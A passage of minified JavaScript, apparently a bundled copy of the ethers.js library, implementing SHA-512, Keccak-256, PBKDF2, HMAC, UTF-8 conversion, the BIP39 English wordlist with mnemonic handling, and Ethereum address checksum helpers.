                      , t = hB.rotrSL(u, d, 14) ^ hB.rotrSL(u, d, 18) ^ hB.rotrBL(u, d, 41)
                      , v = u & h ^ ~u & p
                      , w = d & f ^ ~d & g
                      , T = hB.add5L(m, t, w, pB[b], yB[b])
                      , A = hB.add5H(T, y, e, v, fB[b], gB[b])
                      , E = 0 | T
                      , P = hB.rotrSH(r, n, 28) ^ hB.rotrBH(r, n, 34) ^ hB.rotrBH(r, n, 39)
                      , C = hB.rotrSL(r, n, 28) ^ hB.rotrBL(r, n, 34) ^ hB.rotrBL(r, n, 39)
                      , S = r & o ^ r & s ^ o & s
                      , I = n & i ^ n & a ^ i & a;
                    y = 0 | p,
                    m = 0 | g,
                    p = 0 | h,
                    g = 0 | f,
                    h = 0 | u,
                    f = 0 | d,
                    ({h: u, l: d} = hB.add(0 | c, 0 | l, 0 | A, 0 | E)),
                    c = 0 | s,
                    l = 0 | a,
                    s = 0 | o,
                    a = 0 | i,
                    o = 0 | r,
                    i = 0 | n;
                    const B = hB.add3L(E, C, I);
                    r = hB.add3H(B, A, P, S),
                    n = 0 | B
                }
                ({h: r, l: n} = hB.add(0 | this.Ah, 0 | this.Al, 0 | r, 0 | n)),
                ({h: o, l: i} = hB.add(0 | this.Bh, 0 | this.Bl, 0 | o, 0 | i)),
                ({h: s, l: a} = hB.add(0 | this.Ch, 0 | this.Cl, 0 | s, 0 | a)),
                ({h: c, l: l} = hB.add(0 | this.Dh, 0 | this.Dl, 0 | c, 0 | l)),
                ({h: u, l: d} = hB.add(0 | this.Eh, 0 | this.El, 0 | u, 0 | d)),
                ({h: h, l: f} = hB.add(0 | this.Fh, 0 | this.Fl, 0 | h, 0 | f)),
                ({h: p, l: g} = hB.add(0 | this.Gh, 0 | this.Gl, 0 | p, 0 | g)),
                ({h: y, l: m} = hB.add(0 | this.Hh, 0 | this.Hl, 0 | y, 0 | m)),
                this.set(r, n, o, i, s, a, c, l, u, d, h, f, p, g, y, m)
            }
            roundClean() {
                gB.fill(0),
                yB.fill(0)
            }
            destroy() {
                this.buffer.fill(0),
                this.set(0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
            }
        }
        const bB = zI(( () => new mB));
        const vB = function() {
            if ("undefined" !== typeof self)
                return self;
            if ("undefined" !== typeof window)
                return window;
            if ("undefined" !== typeof global)
                return global;
            throw new Error("unable to locate global object")
        }()
          , wB = vB.crypto || vB.msCrypto;
        function TB(e) {
            switch (e) {
            case "sha256":
                return rB.create();
            case "sha512":
                return bB.create()
            }
            NS(!1, "invalid hashing algorithm name", "algorithm", e)
        }
        const AB = function(e) {
            return TB("sha256").update(e).digest()
        }
          , EB = function(e) {
            return TB("sha512").update(e).digest()
        };
        let PB = AB
          , CB = EB
          , SB = !1
          , IB = !1;
        function BB(e) {
            const t = zS(e, "data");
            return $S(PB(t))
        }
        function xB(e) {
            const t = zS(e, "data");
            return $S(CB(t))
        }
        BB._ = AB,
        BB.lock = function() {
            SB = !0
        }
        ,
        BB.register = function(e) {
            if (SB)
                throw new Error("sha256 is locked");
            PB = e
        }
        ,
        Object.freeze(BB),
        xB._ = EB,
        xB.lock = function() {
            IB = !0
        }
        ,
        xB.register = function(e) {
            if (IB)
                throw new Error("sha512 is locked");
            CB = e
        }
        ,
        Object.freeze(BB);
        let OB = !1;
        const _B = function(e, t, r, n, o) {
            return function(e, t, r, n, o) {
                const i = {
                    sha256: rB,
                    sha512: bB
                }[o];
                return NS(null != i, "invalid pbkdf2 algorithm", "algorithm", o),
                KI(i, e, t, {
                    c: r,
                    dkLen: n
                })
            }(e, t, r, n, o)
        };
        let WB = _B;
        function RB(e, t, r, n, o) {
            const i = zS(e, "password")
              , s = zS(t, "salt");
            return $S(WB(i, s, r, n, o))
        }
        function kB(e, t, r, n, o) {
            if ("BAD_PREFIX" === e || "UNEXPECTED_CONTINUE" === e) {
                let e = 0;
                for (let n = t + 1; n < r.length && r[n] >> 6 === 2; n++)
                    e++;
                return e
            }
            return "OVERRUN" === e ? r.length - t - 1 : 0
        }
        RB._ = _B,
        RB.lock = function() {
            OB = !0
        }
        ,
        RB.register = function(e) {
            if (OB)
                throw new Error("pbkdf2 is locked");
            WB = e
        }
        ,
        Object.freeze(RB);
        const MB = Object.freeze({
            error: function(e, t, r, n, o) {
                NS(!1, "invalid codepoint at offset ".concat(t, "; ").concat(e), "bytes", r)
            },
            ignore: kB,
            replace: function(e, t, r, n, o) {
                return "OVERLONG" === e ? (NS("number" === typeof o, "invalid bad code point for replacement", "badCodepoint", o),
                n.push(o),
                0) : (n.push(65533),
                kB(e, t, r))
            }
        });
        function NB(e, t) {
            null == t && (t = MB.error);
            const r = zS(e, "bytes")
              , n = [];
            let o = 0;
            for (; o < r.length; ) {
                const e = r[o++];
                if (e >> 7 === 0) {
                    n.push(e);
                    continue
                }
                let i = null
                  , s = null;
                if (192 === (224 & e))
                    i = 1,
                    s = 127;
                else if (224 === (240 & e))
                    i = 2,
                    s = 2047;
                else {
                    if (240 !== (248 & e)) {
                        o += t(128 === (192 & e) ? "UNEXPECTED_CONTINUE" : "BAD_PREFIX", o - 1, r, n);
                        continue
                    }
                    i = 3,
                    s = 65535
                }
                if (o - 1 + i >= r.length) {
                    o += t("OVERRUN", o - 1, r, n);
                    continue
                }
                let a = e & (1 << 8 - i - 1) - 1;
                for (let c = 0; c < i; c++) {
                    let e = r[o];
                    if (128 != (192 & e)) {
                        o += t("MISSING_CONTINUE", o, r, n),
                        a = null;
                        break
                    }
                    a = a << 6 | 63 & e,
                    o++
                }
                null !== a && (a > 1114111 ? o += t("OUT_OF_RANGE", o - 1 - i, r, n, a) : a >= 55296 && a <= 57343 ? o += t("UTF16_SURROGATE", o - 1 - i, r, n, a) : a <= s ? o += t("OVERLONG", o - 1 - i, r, n, a) : n.push(a))
            }
            return n
        }
        function FB(e, t) {
            NS("string" === typeof e, "invalid string value", "str", e),
            null != t && (DS(t),
            e = e.normalize(t));
            let r = [];
            for (let n = 0; n < e.length; n++) {
                const t = e.charCodeAt(n);
                if (t < 128)
                    r.push(t);
                else if (t < 2048)
                    r.push(t >> 6 | 192),
                    r.push(63 & t | 128);
                else if (55296 == (64512 & t)) {
                    n++;
                    const o = e.charCodeAt(n);
                    NS(n < e.length && 56320 === (64512 & o), "invalid surrogate pair", "str", e);
                    const i = 65536 + ((1023 & t) << 10) + (1023 & o);
                    r.push(i >> 18 | 240),
                    r.push(i >> 12 & 63 | 128),
                    r.push(i >> 6 & 63 | 128),
                    r.push(63 & i | 128)
                } else
                    r.push(t >> 12 | 224),
                    r.push(t >> 6 & 63 | 128),
                    r.push(63 & t | 128)
            }
            return new Uint8Array(r)
        }
        function UB(e, t) {
            return NB(e, t).map((e => e <= 65535 ? String.fromCharCode(e) : (e -= 65536,
            String.fromCharCode(55296 + (e >> 10 & 1023), 56320 + (1023 & e))))).join("")
        }
        function DB(e, t) {
            AS(e, t),
            t.add(e)
        }
        const [LB,jB,zB] = [[], [], []]
          , VB = BigInt(0)
          , HB = BigInt(1)
          , qB = BigInt(2)
          , GB = BigInt(7)
          , $B = BigInt(256)
          , KB = BigInt(113);
        for (let r = 0, zK = HB, VK = 1, HK = 0; r < 24; r++) {
            [VK,HK] = [HK, (2 * VK + 3 * HK) % 5],
            LB.push(2 * (5 * HK + VK)),
            jB.push((r + 1) * (r + 2) / 2 % 64);
            let e = VB;
            for (let t = 0; t < 7; t++)
                zK = (zK << HB ^ (zK >> GB) * KB) % $B,
                zK & qB && (e ^= HB << (HB << BigInt(t)) - HB);
            zB.push(e)
        }
        const [ZB,YB] = sB(zB, !0)
          , JB = (e, t, r) => r > 32 ? lB(e, t, r) : aB(e, t, r)
          , XB = (e, t, r) => r > 32 ? uB(e, t, r) : cB(e, t, r);
        class QB extends DI {
            constructor(e, t, r) {
                let n = arguments.length > 3 && void 0 !== arguments[3] && arguments[3]
                  , o = arguments.length > 4 && void 0 !== arguments[4] ? arguments[4] : 24;
                if (super(),
                this.blockLen = e,
                this.suffix = t,
                this.outputLen = r,
                this.enableXOF = n,
                this.rounds = o,
                this.pos = 0,
                this.posOut = 0,
                this.finished = !1,
                this.destroyed = !1,
                SI(r),
                0 >= this.blockLen || this.blockLen >= 200)
                    throw new Error("Sha3 supports only keccak-f1600 function");
                this.state = new Uint8Array(200),
                this.state32 = RI(this.state)
            }
            keccak() {
                !function(e) {
                    let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : 24;
                    const r = new Uint32Array(10);
                    for (let n = 24 - t; n < 24; n++) {
                        for (let n = 0; n < 10; n++)
                            r[n] = e[n] ^ e[n + 10] ^ e[n + 20] ^ e[n + 30] ^ e[n + 40];
                        for (let n = 0; n < 10; n += 2) {
                            const t = (n + 8) % 10
                              , o = (n + 2) % 10
                              , i = r[o]
                              , s = r[o + 1]
                              , a = JB(i, s, 1) ^ r[t]
                              , c = XB(i, s, 1) ^ r[t + 1];
                            for (let r = 0; r < 50; r += 10)
                                e[n + r] ^= a,
                                e[n + r + 1] ^= c
                        }
                        let t = e[2]
                          , o = e[3];
                        for (let r = 0; r < 24; r++) {
                            const n = jB[r]
                              , i = JB(t, o, n)
                              , s = XB(t, o, n)
                              , a = LB[r];
                            t = e[a],
                            o = e[a + 1],
                            e[a] = i,
                            e[a + 1] = s
                        }
                        for (let n = 0; n < 50; n += 10) {
                            for (let t = 0; t < 10; t++)
                                r[t] = e[n + t];
                            for (let t = 0; t < 10; t++)
                                e[n + t] ^= ~r[(t + 2) % 10] & r[(t + 4) % 10]
                        }
                        e[0] ^= ZB[n],
                        e[1] ^= YB[n]
                    }
                    r.fill(0)
                }(this.state32, this.rounds),
                this.posOut = 0,
                this.pos = 0
            }
            update(e) {
                xI(this);
                const {blockLen: t, state: r} = this
                  , n = (e = UI(e)).length;
                for (let o = 0; o < n; ) {
                    const i = Math.min(t - this.pos, n - o);
                    for (let t = 0; t < i; t++)
                        r[this.pos++] ^= e[o++];
                    this.pos === t && this.keccak()
                }
                return this
            }
            finish() {
                if (this.finished)
                    return;
                this.finished = !0;
                const {state: e, suffix: t, pos: r, blockLen: n} = this;
                e[r] ^= t,
                0 !== (128 & t) && r === n - 1 && this.keccak(),
                e[n - 1] ^= 128,
                this.keccak()
            }
            writeInto(e) {
                xI(this, !1),
                II(e),
                this.finish();
                const t = this.state
                  , {blockLen: r} = this;
                for (let n = 0, o = e.length; n < o; ) {
                    this.posOut >= r && this.keccak();
                    const i = Math.min(r - this.posOut, o - n);
                    e.set(t.subarray(this.posOut, this.posOut + i), n),
                    this.posOut += i,
                    n += i
                }
                return e
            }
            xofInto(e) {
                if (!this.enableXOF)
                    throw new Error("XOF is not possible for this instance");
                return this.writeInto(e)
            }
            xof(e) {
                return SI(e),
                this.xofInto(new Uint8Array(e))
            }
            digestInto(e) {
                if (OI(e, this),
                this.finished)
                    throw new Error("digest() was already called");
                return this.writeInto(e),
                this.destroy(),
                e
            }
            digest() {
                return this.digestInto(new Uint8Array(this.outputLen))
            }
            destroy() {
                this.destroyed = !0,
                this.state.fill(0)
            }
            _cloneInto(e) {
                const {blockLen: t, suffix: r, outputLen: n, rounds: o, enableXOF: i} = this;
                return e || (e = new QB(t,r,n,i,o)),
                e.state32.set(this.state32),
                e.pos = this.pos,
                e.posOut = this.posOut,
                e.finished = this.finished,
                e.rounds = o,
                e.suffix = r,
                e.outputLen = n,
                e.enableXOF = i,
                e.destroyed = this.destroyed,
                e
            }
        }
        const ex = (e, t, r) => zI(( () => new QB(t,e,r)))
          , tx = ex(1, 136, 32);
        let rx = !1;
        const nx = function(e) {
            return tx(e)
        };
        let ox = nx;
        function ix(e) {
            const t = zS(e, "data");
            return $S(ox(t))
        }
        function sx(e) {
            return ix(FB(e))
        }
        ix._ = nx,
        ix.lock = function() {
            rx = !0
        }
        ,
        ix.register = function(e) {
            if (rx)
                throw new TypeError("keccak256 is locked");
            ox = e
        }
        ,
        Object.freeze(ix);
        const ax = " !#$%&'()*+,-./<=>?@[]^_`{|}~"
          , cx = /^[a-z]*$/i;
        function lx(e, t) {
            let r = 97;
            return e.reduce(( (e, n) => (n === t ? r++ : n.match(cx) ? e.push(String.fromCharCode(r) + n) : (r = 97,
            e.push(n)),
            e)), [])
        }
        function ux(e) {
            return NS("0" === e[0], "unsupported auwl data", "data", e),
            function(e, t) {
                for (let o = 28; o >= 0; o--)
                    e = e.split(ax[o]).join(t.substring(2 * o, 2 * o + 2));
                const r = []
                  , n = e.replace(/(:|([0-9])|([A-Z][a-z]*))/g, ( (e, t, n, o) => {
                    if (n)
                        for (let i = parseInt(n); i >= 0; i--)
                            r.push(";");
                    else
                        r.push(t.toLowerCase());
                    return ""
                }
                ));
                if (n)
                    throw new Error("leftovers: ".concat(JSON.stringify(n)));
                return lx(lx(r, ";"), ":")
            }(e.substring(59), e.substring(1, 59))
        }
        class dx {
            constructor(e) {
                (0,
                CI.A)(this, "locale", void 0),
                _S(this, {
                    locale: e
                })
            }
            split(e) {
                return e.toLowerCase().split(/\s+/g)
            }
            join(e) {
                return e.join(" ")
            }
        }
        var hx = new WeakMap
          , fx = new WeakMap
          , px = new WeakMap
          , gx = new WeakSet;
        class yx extends dx {
            constructor(e, t, r) {
                super(e),
                DB(this, gx),
                ES(this, hx, void 0),
                ES(this, fx, void 0),
                ES(this, px, void 0),
                CS(hx, this, t),
                CS(fx, this, r),
                CS(px, this, null)
            }
            get _data() {
                return SS(hx, this)
            }
            _decodeWords() {
                return ux(SS(hx, this))
            }
            getWord(e) {
                const t = PS(gx, this, mx).call(this);
                return NS(e >= 0 && e < t.length, "invalid word index: ".concat(e), "index", e),
                t[e]
            }
            getWordIndex(e) {
                return PS(gx, this, mx).call(this).indexOf(e)
            }
        }
        function mx() {
            if (null == SS(px, this)) {
                const e = this._decodeWords();
                if (sx(e.join("\n") + "\n") !== SS(fx, this))
                    throw new Error("BIP39 Wordlist for ".concat(this.locale, " FAILED"));
                CS(px, this, e)
            }
            return SS(px, this)
        }
        let bx = null;
        class vx extends yx {
            constructor() {
                super("en", "0erleonalorenseinceregesticitStanvetearctssi#ch2Athck&tneLl0And#Il.yLeOutO=S|S%b/ra@SurdU'0Ce[Cid|CountCu'Hie=IdOu,-Qui*Ro[TT]T%T*[Tu$0AptDD-tD*[Ju,M.UltV<)Vi)0Rob-0FairF%dRaid0A(EEntRee0Ead0MRRp%tS!_rmBumCoholErtI&LLeyLowMo,O}PhaReadySoT Ways0A>urAz(gOngOuntU'd0Aly,Ch%Ci|G G!GryIm$K!Noun)Nu$O` Sw T&naTiqueXietyY1ArtOlogyPe?P!Pro=Ril1ChCt-EaEnaGueMMedM%MyOundR<+Re,Ri=RowTTefa@Ti,Tw%k0KPe@SaultSetSi,SumeThma0H!>OmTa{T&dT.udeTra@0Ct]D.Gu,NtTh%ToTumn0Era+OcadoOid0AkeA*AyEsomeFulKw?d0Is:ByChel%C#D+GL<)Lc#y~MbooN<aNn RRelyRga(R*lSeS-SketTt!3A^AnAutyCau'ComeEfF%eG(Ha=H(dLie=LowLtN^Nef./TrayTt Twe&Y#d3Cyc!DKeNdOlogyRdR`Tt _{AdeAmeAnketA,EakE[IndOodO[omOu'UeUrUsh_rdAtDyIlMbNeNusOkO,Rd R(gRrowSsTtomUn)XY_{etA(AndA[A=EadEezeI{Id+IefIghtIngIskOccoliOk&OnzeOomO` OwnUsh2Bb!DdyD+tFf$oIldLbLkL!tNd!Nk Rd&Rg R,SS(e[SyTt Y Zz:Bba+B(B!CtusGeKe~LmM aMpNN$N)lNdyNn#NoeNvasNy#Pab!P.$Pta(RRb#RdRgoRpetRryRtSeShS(o/!Su$TT$ogT^Teg%yTt!UghtU'Ut]Ve3Il(gL yM|NsusNturyRe$Rta(_irAlkAmp]An+AosApt Ar+A'AtEapE{Ee'EfErryE,I{&IefIldIm}yOi)Oo'R#-U{!UnkUrn0G?Nnam#Rc!Tiz&TyVil_imApArifyAwAyE<ErkEv I{I|IffImbIn-IpO{OgO'O`OudOwnUbUmpU, Ut^_^A,C#utDeFfeeIlInL!@L%LumnMb(eMeMf%tM-Mm#Mp<yNc tNdu@NfirmNg*[N}@Nsid NtrolNv()OkOlPp PyR$ReRnR*@/Tt#U^UntryUp!Ur'Us(V Yo>_{Ad!AftAmA}AshAt AwlAzyEamEd.EekEwI{etImeIspIt-OpO[Ou^OwdUci$UelUi'Umb!Un^UshYY,$2BeLtu*PPbo?dRiousRr|Rta(R=Sh]/omTe3C!:DMa+MpN)Ng R(gShUght WnY3AlBa>BrisCadeCemb CideCl(eC%a>C*a'ErF&'F(eFyG*eLayLiv M<dMi'Ni$Nti,NyP?tP&dPos.P`PutyRi=ScribeS tSignSkSpair/royTailTe@VelopVi)Vo>3AgramAlAm#dAryCeE'lEtFf G.$Gn.yLemmaNn NosaurRe@RtSag*eScov Sea'ShSmi[S%d Splay/<)V tVideV%)Zzy5Ct%Cum|G~Lph(Ma(Na>NkeyN%OrSeUb!Ve_ftAg#AmaA,-AwEamE[IftIllInkIpI=OpUmY2CkMbNeR(g/T^Ty1Arf1Nam-:G G!RlyRnR`Sily/Sy1HoOlogyOnomy0GeItUca>1F%t0G1GhtTh 2BowD E@r-Eg<tEm|Eph<tEvat%I>Se0B?kBodyBra)Er+Ot]PloyPow Pty0Ab!A@DD![D%'EmyErgyF%)Ga+G(eH<)JoyLi,OughR-hRollSu*T Ti*TryVelope1Isode0U$Uip0AA'OdeOs]R%Upt0CapeSayS&)Ta>0Ern$H-s1Id&)IlOkeOl=1A@Amp!Ce[Ch<+C.eCludeCu'Ecu>Erci'Hau,Hib.I!I,ItOt-P<dPe@Pi*Pla(Po'P*[T&dTra0EEbrow:Br-CeCultyDeIntI`~L'MeMilyMousNNcyNtasyRmSh]TT$Th TigueUltV%.e3Atu*Bru?yD $EEdElMa!N)/iv$T^V W3B Ct]EldGu*LeLmLt N$NdNeNg NishReRmR,Sc$ShTT}[X_gAmeAshAtAv%EeIghtIpOatO{O%Ow UidUshY_mCusGIlLd~owOdOtR)Re,R+tRkRtu}RumRw?dSsil/ UndX_gi!AmeEqu|EshI&dIn+OgOntO,OwnOz&U.2ElNNnyRna)RyTu*:D+tInLaxy~ yMePRa+Rba+Rd&Rl-Rm|SSpTeTh U+Ze3N $NiusN*Nt!Nu(e/u*2O,0AntFtGg!Ng RaffeRlVe_dAn)A*A[IdeImp'ObeOomOryO=OwUe_tDde[LdOdO'RillaSpelSsipV nWn_bA)A(AntApeA[Av.yEatE&IdIefItOc yOupOwUnt_rdE[IdeIltIt?N3M:B.IrLfMm M, NdPpyRb%RdRshR=,TVeWkZ?d3AdAl`ArtAvyD+hogIght~oLmetLpNRo3Dd&Gh~NtPRe/%y5BbyCkeyLdLeLiday~owMeNeyOdPeRnRr%R'Sp.$/TelUrV 5BGeM<Mb!M%Nd*dNgryNtRd!RryRtSb<d3Brid:1EOn0EaEntifyLe2N%e4LLeg$L}[0A+Ita>M&'Mu}Pa@Po'Pro=Pul'0ChCludeComeC*a'DexD-a>Do%Du,ryF<tFl-tF%mHa!H .Iti$Je@JuryMa>N Noc|PutQuiryS<eSe@SideSpi*/$lTa@T e,ToVe,V.eVol=3On0L<dOla>Sue0Em1Ory:CketGu?RZz3AlousAns~yWel9BInKeUr}yY5D+I)MpNg!Ni%Nk/:Ng?oo3EnEpT^upY3CkDD}yNdNgdomSsTT^&TeTt&Wi4EeIfeO{Ow:BBelB%Dd DyKeMpNgua+PtopR+T T(UghUndryVaWWnWsu.Y Zy3Ad AfArnA=Ctu*FtGG$G&dIsu*M#NdNg`NsOp?dSs#Tt Vel3ArB tyBr?yC&'FeFtGhtKeMbM.NkOnQuid/Tt!VeZ?d5AdAnB, C$CkG-NelyNgOpTt yUdUn+VeY$5CkyGga+Mb N?N^Xury3R-s:Ch(eDG-G}tIdIlInJ%KeMm$NNa+Nda>NgoNs]Nu$P!Rb!R^Rg(R(eRketRria+SkSs/ T^T i$ThTrixTt XimumZe3AdowAnAsu*AtCh<-D$DiaLodyLtMb M%yNt]NuRcyR+R.RryShSsa+T$Thod3Dd!DnightLk~]M-NdNimumN%Nu>Rac!Rr%S ySs/akeXXedXtu*5Bi!DelDifyMM|N.%NkeyN, N`OnR$ReRn(gSqu.oTh T]T%Unta(U'VeVie5ChFf(LeLtiplySc!SeumShroomS-/Tu$3Self/ yTh:I=MePk(Rrow/yT]Tu*3ArCkEdGati=G!@I` PhewR=/TTw%kUtr$V WsXt3CeGht5B!I'M(eeOd!Rm$R`SeTab!TeTh(gTi)VelW5C!?Mb R'T:K0EyJe@Li+Scu*S =Ta(Vious0CurE<Tob 0Or1FF Fi)T&2L1Ay0DI=Ymp-0It0CeEI#L(eLy1EnEraIn]Po'T]1An+B.Ch?dD D(?yG<I|Ig($Ph<0Tr-h0H 0Tdo%T TputTside0AlEnEr0NN 0Yg&0/ 0O}:CtDd!GeIrLa)LmNdaNelN-N` P RadeR|RkRrotRtySsT^ThTi|TrolTt nU'VeYm|3A)AnutArAs<tL-<NN$tyNcilOp!Pp Rfe@Rm.Rs#T2O}OtoRa'Ys-$0AnoCn-Ctu*E)GGe#~LotNkO} Pe/olT^Zza_)A}tA,-A>AyEa'Ed+U{UgUn+2EmEtIntL?LeLi)NdNyOlPul?Rt]S.]Ssib!/TatoTt yV tyWd W _@i)Ai'Ed-tEf Epa*Es|EttyEv|I)IdeIm?yIntI%.yIs#Iva>IzeOb!mO)[Odu)Of.OgramOje@Omo>OofOp tyOsp O>@OudOvide2Bl-Dd(g~LpL'Mpk(N^PilPpyR^a'R.yRpo'R'ShTZz!3Ramid:99Al.yAntumArt E,]I{ItIzO>:Bb.Cco#CeCkD?DioIlInI'~yMpN^NdomN+PidReTeTh V&WZ%3AdyAlAs#BelBuildC$lCei=CipeC%dCyc!Du)F!@F%mFu'G]G*tGul?Je@LaxLea'LiefLyMa(Memb M(dMo=Nd NewNtOp&PairPeatPla)P%tQui*ScueSemb!Si,Sour)Sp#'SultTi*T*atTurnUn]Ve$ViewW?d2Y`m0BBb#CeChDeD+F!GhtGidNgOtPp!SkTu$V$V 5AdA,BotBu,CketM<)OfOkieOmSeTa>UghUndU>Y$5Bb DeGLeNNwayR$:DDd!D}[FeIlLadLm#L#LtLu>MeMp!NdTisfyToshiU)Usa+VeY1A!AnA*Att E}HemeHoolI&)I[%sOrp]OutRapRe&RiptRub1AAr^As#AtC#dC*tCt]Cur.yEdEkGm|Le@~M(?Ni%N'Nt&)RiesRvi)Ss]Tt!TupV&_dowAftAllowA*EdEllEriffIeldIftI}IpIv O{OeOotOpOrtOuld O=RimpRugUff!Y0Bl(gCkDeE+GhtGnL|Lk~yLv Mil?Mp!N)NgR&/ Tua>XZe1A>Et^IIllInIrtUll0AbAmEepEnd I)IdeIghtImOg<OtOwUsh0AllArtI!OkeOo`0A{AkeApIffOw0ApCc Ci$CkDaFtL?Ldi LidLut]L=Me#eNgOnRryRtUlUndUpUr)U`0A)A*Ati$AwnEakEci$EedEllEndH eI)Id IkeInIr.L.OilOns%O#OrtOtRayReadR(gY0Ua*UeezeUir*l_b!AdiumAffA+AirsAmpAndArtA>AyEakEelEmEpE*oI{IllIngO{Oma^O}OolOryO=Ra>gyReetRikeR#gRugg!Ud|UffUmb!Y!0Bje@Bm.BwayC)[ChDd&Ff G?G+,ItMm NNnyN'tP PplyP*meReRfa)R+Rpri'RroundR=ySpe@/a(1AllowAmpApArmE?EetIftImIngIt^Ord1MbolMptomRup/em:B!Ck!GIlL|LkNkPeR+tSk/eTtooXi3A^Am~NN<tNnisNtRm/Xt_nkAtEmeEnE%yE*EyIngIsOughtReeRi=RowUmbUnd 0CketDeG LtMb MeNyPRedSsueT!5A,BaccoDayDdl EGe` I!tK&MatoM%rowNeNgueNightOlO`PP-Pp!R^RnadoRtoi'SsT$Uri,W?dW WnY_{AdeAff-Ag-A(Ansf ApAshA=lAyEatEeEndI$IbeI{Igg ImIpOphyOub!U{UeUlyUmpetU,U`Y2BeIt]Mb!NaN}lRkeyRnRt!1El=EntyI)InI,O1PeP-$:5Ly5B*lla0Ab!Awa*C!Cov D DoFairFoldHappyIf%mIqueItIv 'KnownLo{TilUsu$Veil1Da>GradeHoldOnP Set1B<Ge0A+EEdEfulE![U$0Il.y:C<tCuumGueLidL!yL=NNishP%Rious/Ult3H-!L=tNd%Ntu*NueRbRifyRs]RyS'lT <3Ab!Br<tCiousCt%yDeoEw~a+Nta+Ol(Rtu$RusSaS.Su$T$Vid5C$I)IdLc<oLumeTeYa+:GeG#ItLk~LnutNtRfa*RmRri%ShSp/eT VeY3Al`Ap#ArA'lA` BDd(gEk&dIrdLcome/T_!AtEatEelEnE*IpIsp 0DeD`FeLd~NNdowNeNgNkNn Nt ReSdomSeShT}[5LfM<Nd OdOlRdRkRldRryR`_pE{E,!I,I>Ong::Rd3Ar~ow9UUngU`:3BraRo9NeO", "0x3c8acc1e7b08d8e76f9fda015ef48dc8c710a73cb7e0f77b2c18a9b5a7adde60")
            }
            static wordlist() {
                return null == bx && (bx = new vx),
                bx
            }
        }
        function wx(e) {
            return (1 << e) - 1 << 8 - e & 255
        }
        function Tx(e, t) {
            DS("NFKD"),
            null == t && (t = vx.wordlist());
            const r = t.split(e);
            NS(r.length % 3 === 0 && r.length >= 12 && r.length <= 24, "invalid mnemonic length", "mnemonic", "[ REDACTED ]");
            const n = new Uint8Array(Math.ceil(11 * r.length / 8));
            let o = 0;
            for (let a = 0; a < r.length; a++) {
                let e = t.getWordIndex(r[a].normalize("NFKD"));
                NS(e >= 0, "invalid mnemonic word at index ".concat(a), "mnemonic", "[ REDACTED ]");
                for (let t = 0; t < 11; t++)
                    e & 1 << 10 - t && (n[o >> 3] |= 1 << 7 - o % 8),
                    o++
            }
            const i = 32 * r.length / 3
              , s = wx(r.length / 3);
            return NS((zS(BB(n.slice(0, i / 8)))[0] & s) === (n[n.length - 1] & s), "invalid mnemonic checksum", "mnemonic", "[ REDACTED ]"),
            $S(n.slice(0, i / 8))
        }
        function Ax(e, t) {
            NS(e.length % 4 === 0 && e.length >= 16 && e.length <= 32, "invalid entropy size", "entropy", "[ REDACTED ]"),
            null == t && (t = vx.wordlist());
            const r = [0];
            let n = 11;
            for (let s = 0; s < e.length; s++)
                n > 8 ? (r[r.length - 1] <<= 8,
                r[r.length - 1] |= e[s],
                n -= 8) : (r[r.length - 1] <<= n,
                r[r.length - 1] |= e[s] >> 8 - n,
                r.push(e[s] & ((1 << 8 - n) - 1 & 255)),
                n += 3);
            const o = e.length / 4
              , i = parseInt(BB(e).substring(2, 4), 16) & wx(o);
            return r[r.length - 1] <<= o,
            r[r.length - 1] |= i >> 8 - o,
            t.join(r.map((e => t.getWord(e))))
        }
        const Ex = {};
        class Px {
            constructor(e, t, r, n, o) {
                (0,
                CI.A)(this, "phrase", void 0),
                (0,
                CI.A)(this, "password", void 0),
                (0,
                CI.A)(this, "wordlist", void 0),
                (0,
                CI.A)(this, "entropy", void 0),
                null == n && (n = ""),
                null == o && (o = vx.wordlist()),
                LS(e, Ex, "Mnemonic"),
                _S(this, {
                    phrase: r,
                    password: n,
                    wordlist: o,
                    entropy: t
                })
            }
            computeSeed() {
                const e = FB("mnemonic" + this.password, "NFKD");
                return RB(FB(this.phrase, "NFKD"), e, 2048, 64, "sha512")
            }
            static fromPhrase(e, t, r) {
                const n = Tx(e, r);
                return e = Ax(zS(n), r),
                new Px(Ex,n,e,t,r)
            }
            static fromEntropy(e, t, r) {
                const n = zS(e, "entropy")
                  , o = Ax(n, r);
                return new Px(Ex,$S(n),o,t,r)
            }
            static entropyToPhrase(e, t) {
                return Ax(zS(e, "entropy"), t)
            }
            static phraseToEntropy(e, t) {
                return Tx(e, t)
            }
            static isValidMnemonic(e, t) {
                try {
                    return Tx(e, t),
                    !0
                } catch (r) {}
                return !1
            }
        }
        let Cx = !1;
        const Sx = function(e, t, r) {
            return function(e, t) {
                const r = {
                    sha256: rB,
                    sha512: bB
                }[e];
                return NS(null != r, "invalid hmac algorithm", "algorithm", e),
                qI.create(r, t)
            }(e, t).update(r).digest()
        };
        let Ix = Sx;
        function Bx(e, t, r) {
            const n = zS(t, "key")
              , o = zS(r, "data");
            return $S(Ix(e, n, o))
        }
        Bx._ = Sx,
        Bx.lock = function() {
            Cx = !0
        }
        ,
        Bx.register = function(e) {
            if (Cx)
                throw new Error("computeHmac is locked");
            Ix = e
        }
        ,
        Object.freeze(Bx);
        const xx = BigInt(0)
          , Ox = BigInt(36);
        function _x(e) {
            const t = (e = e.toLowerCase()).substring(2).split("")
              , r = new Uint8Array(40);
            for (let o = 0; o < 40; o++)
                r[o] = t[o].charCodeAt(0);
            const n = zS(ix(r));
            for (let o = 0; o < 40; o += 2)
                n[o >> 1] >> 4 >= 8 && (t[o] = t[o].toUpperCase()),
                (15 & n[o >> 1]) >= 8 && (t[o + 1] = t[o + 1].toUpperCase());
            return "0x" + t.join("")
        }
        const Wx = {};
        for (let r = 0; r < 10; r++)
            Wx[String(r)] = String(r);
        for (let r = 0; r < 26; r++)
            Wx[String.fromCharCode(65 + r)] = String(10 + r);
        const Rx = 15;
        function kx(e) {
            let t = (e = (e = e.toUpperCase()).substring(4) + e.substring(0, 2) + "00").split("").map((e => Wx[e])).join("");
            for (; t.length >= Rx; ) {
                let e = t.substring(0, Rx);
                t = parseInt(e, 10) % 97 + t.substring(e.length)
            }
            let r = String(98 - parseInt(t, 10) % 97);
            for (; r.length < 2; )
                r = "0" + r;
            return r
        }
        const Mx = function() {
            const e = {};
            for (let t = 0; t < 36; t++) {
                e["0123456789abcdefghijklmnopqrstuvwxyz"[t]] = BigInt(t)
            }
            return e
        }();
        function Nx(e) {
            if (NS("string" === typeof e, "invalid address", "address", e),
